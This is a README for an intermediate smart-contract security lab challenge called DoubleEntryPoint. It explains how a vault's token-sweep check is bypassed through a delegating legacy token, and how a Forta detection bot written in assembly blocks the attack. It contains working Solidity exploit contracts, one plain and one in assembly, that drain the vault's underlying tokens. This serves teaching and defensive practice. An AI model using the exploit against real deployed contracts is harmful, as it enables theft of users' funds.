# Challenge 04: DoubleEntryPoint

**Difficulty:** ⭐⭐⭐ Intermediate  
**Vulnerability Type:** Delegation Attack / Detection Bot Bypass  
**Key Learning:** Assembly calldata parsing, advanced detection systems, sophisticated attack vectors

---

## 📖 Overview

This challenge demonstrates a sophisticated attack vector involving delegated calls between contracts and explores advanced defense mechanisms through assembly-based detection bots. The vulnerability lies in how token delegation can be exploited to bypass security checks.

## 🎯 Objective

**Goal:** Understand and exploit a delegation vulnerability where a vault's token sweeping mechanism can be tricked into draining its underlying tokens through a cleverly crafted delegation attack.

**Learning Outcomes:**
- Master delegation patterns and their security implications
- Learn assembly-based calldata parsing for detection systems
- Understand sophisticated attack vectors involving multiple contracts
- Explore advanced defense mechanisms and detection bots
- Practice manual function selector calculation and calldata construction

---

## 🔍 Vulnerability Analysis

### The Setup

The challenge involves multiple interconnected contracts:

1. **CryptoVault** - Can sweep tokens but protects its "underlying" token
2. **LegacyToken** - An old ERC20 that can delegate transfers to newer contracts
3. **DoubleEntryPoint** - The main token that receives delegated calls
4. **Forta** - A monitoring system that can detect and prevent attacks

### The Vulnerability

The attack vector is subtle but powerful:

```solidity
// This seems safe - vault won't sweep its underlying token (DoubleEntryPoint)
vault.sweepToken(legacyToken);  

// But LegacyToken delegates to DoubleEntryPoint:
legacyToken.transfer(recipient, amount);
// ↓ becomes ↓
doubleEntryPoint.delegateTransfer(recipient, amount, vault);

// This transfers DoubleEntryPoint tokens FROM the vault!
```

**The Attack Flow:**
1. Vault has both LegacyToken and DoubleEntryPoint tokens
2. LegacyToken is configured to delegate all transfers to DoubleEntryPoint
3. Attacker calls `vault.sweepToken(legacyToken)`
4. Vault checks: "legacyToken != doubleEntryPoint" ✓ (passes)
5. Vault calls `legacyToken.transfer(recipient, vaultBalance)`
6. LegacyToken delegates to `doubleEntryPoint.delegateTransfer(recipient, amount, vault)`
7. **Result:** DoubleEntryPoint tokens are transferred FROM vault TO recipient

### The Detection System

The defense involves a sophisticated detection bot that:
- Monitors all calls to `delegateTransfer`
- Uses assembly to parse calldata and extract the `origSender` parameter
- Raises an alert if `origSender` equals the vault address
- Prevents the transaction from completing

---

## 🛠 Technical Implementation

### Core Contracts

#### CryptoVault
```solidity
contract CryptoVault {
    function sweepToken(IERC20 token) public {
        require(token != underlying, "Can't transfer underlying token");
        uint256 balance = token.balanceOf(address(this));
        token.transfer(sweptTokensRecipient, balance);
    }
}
```

#### LegacyToken (Delegation)
```solidity
contract LegacyToken is ERC20 {
    DelegateERC20 public delegate;
    
    function transfer(address to, uint256 value) public override returns (bool) {
        if (address(delegate) == address(0)) {
            return super.transfer(to, value);
        } else {
            return delegate.delegateTransfer(to, value, msg.sender);
        }
    }
}
```

#### DoubleEntryPoint (Vulnerable)
```solidity
contract DoubleEntryPoint is ERC20, DelegateERC20 {
    function delegateTransfer(address to, uint256 value, address origSender)
        public onlyDelegateFrom fortaNotify returns (bool) {
        _transfer(origSender, to, value);  // ← Vulnerability here
        return true;
    }
}
```

### Detection Bot (Assembly Implementation)

The detection bot uses advanced assembly techniques:

```solidity
function handleTransaction(address user, bytes calldata msgData) external {
    assembly {
        // Verify caller is Forta
        let _forta := sload(forta.slot)
        if iszero(eq(caller(), _forta)) { revert(0, 0) }

        // Calculate delegateTransfer selector dynamically
        let fmp := mload(0x40)
        mstore(fmp, "delegateTransfer(address,uint256,address)")
        let selector := shr(224, keccak256(fmp, 41))

        // Extract function selector from msgData
        let msgSelector := shr(224, calldataload(msgData.offset))
        
        // Extract origSender (3rd parameter at offset 0x44)
        let origSender := calldataload(add(msgData.offset, 0x44))

        // Check if this is an attack
        if and(eq(msgSelector, selector), eq(origSender, sload(vault.slot))) {
            // Raise alert to prevent the attack
            mstore(0, "raiseAlert(address)")
            mstore(0, keccak256(0, 19))
            mstore(4, user)
            let success := call(gas(), _forta, 0, 0, 0x24, 0, 0)
            if iszero(success) { revert(0, 0) }
        }
    }
}
```

**Assembly Techniques Demonstrated:**
- Direct storage slot access (`sload`)
- Dynamic function selector calculation using `keccak256`
- Advanced calldata parsing with proper offset handling
- External contract calls with custom error handling
- Bitwise operations for selector extraction

---

## 💥 Attack Vectors

### 1. Basic Solidity Exploit
```solidity
contract DoubleEntryPointExploit {
    function exploit() external {
        // Simply call sweepToken on the legacy token
        vault.sweepToken(IERC20(address(legacyToken)));
        // Vault's DoubleEntryPoint tokens are now stolen!
    }
}
```

### 2. Assembly Attack (Educational)
```solidity
contract DoubleEntryPointAssemblyAttack {
    function assemblyExploit() external {
        assembly {
            let fmp := mload(0x40)
            
            // Construct sweepToken(address) call
            mstore(fmp, 0x6ea056a900000000000000000000000000000000000000000000000000000000)
            mstore(add(fmp, 0x04), sload(legacyToken.slot))
            
            // Execute the attack
            let success := call(gas(), sload(vault.slot), 0, fmp, 0x24, 0, 0)
            if iszero(success) { revert(0, 0) }
        }
    }
}
```

---

## 🛡 Defense Implementation

### Setting Up the Detection Bot

```solidity
// Deploy the detection bot
DoubleEntryPointFortaBot bot = new DoubleEntryPointFortaBot(forta, vault);

// Register it with Forta for the player
forta.setDetectionBot(address(bot));

// Now attacks will be detected and prevented!
```

### How Detection Works

1. **Transaction Monitoring:** Forta calls the detection bot for every transaction
2. **Assembly Analysis:** Bot parses calldata to identify `delegateTransfer` calls
3. **Attack Detection:** Checks if `origSender` parameter equals vault address
4. **Prevention:** Raises alert causing transaction to revert

---

## 🧪 Testing & Validation

### Running Tests
```bash
# Test the challenge
make test-doubleentrypoint

# Test with verbose output
make test-doubleentrypoint-verbose

# Test assembly attack specifically
make test-doubleentrypoint-assembly

# Test detection bot functionality
make test-doubleentrypoint-detection
```

### Echidna Property Testing
```bash
# Run comprehensive fuzzing
make echidna-doubleentrypoint

# Quick test (10k iterations)
make echidna-doubleentrypoint-quick

# Verbose output with corpus generation
make echidna-doubleentrypoint-verbose
```

### Key Test Properties
```solidity
// Vault should retain tokens unless legitimately transferred
function echidna_vault_should_retain_tokens() public view returns (bool);

// Detection bot should prevent drainage when active
function echidna_detection_bot_prevents_drainage() public view returns (bool);

// LegacyToken balance should remain stable (delegation doesn't move it)
function echidna_legacy_token_balance_stable() public view returns (bool);
```

---

## 📚 Educational Value

### Key Concepts Learned

1. **Delegation Patterns**
   - Understanding how contract delegation works
   - Security implications of delegated calls
   - Attack vectors involving proxy patterns

2. **Assembly Programming**
   - Manual calldata parsing and construction
   - Direct storage slot manipulation
   - Dynamic function selector calculation
   - Advanced bitwise operations

3. **Detection Systems**
   - Real-time transaction monitoring
   - Assembly-based calldata analysis
   - Automated defense mechanisms
   - Alert systems and prevention logic

4. **Complex Attack Vectors**
   - Multi-contract interactions
   - Indirect vulnerability exploitation
   - Bypass techniques for security checks
   - Chain reaction attacks

### Advanced Techniques

- **Calldata Parsing:** Learn to manually parse function calls in assembly
- **Storage Optimization:** Direct slot access for gas efficiency
- **Error Handling:** Custom revert messages in assembly
- **External Calls:** Safe external contract interaction patterns

---

## 🎯 Challenge Completion

### Success Criteria

1. **Exploit the Vulnerability:** Successfully drain the vault's DoubleEntryPoint tokens
2. **Implement Detection:** Create a detection bot that prevents the attack
3. **Understand Assembly:** Comprehend the advanced assembly techniques used
4. **Test Coverage:** Ensure all edge cases and scenarios are covered

### Advanced Goals

- Implement the detection bot using pure assembly
- Create alternative attack vectors
- Optimize gas usage in the detection logic
- Explore similar delegation vulnerabilities in other contexts

---

## 🔗 References

- [Delegation Pattern Security](https://docs.soliditylang.org/en/latest/security-considerations.html#delegatecall)
- [Assembly Programming Guide](https://docs.soliditylang.org/en/latest/assembly.html)
- [Calldata Layout Documentation](https://docs.soliditylang.org/en/latest/abi-spec.html)
- [Detection Bot Best Practices](https://docs.forta.network/en/latest/)

---

*This challenge demonstrates advanced concepts in smart contract security, assembly programming, and sophisticated attack/defense mechanisms. It's designed for developers looking to master complex security patterns and low-level Solidity programming.*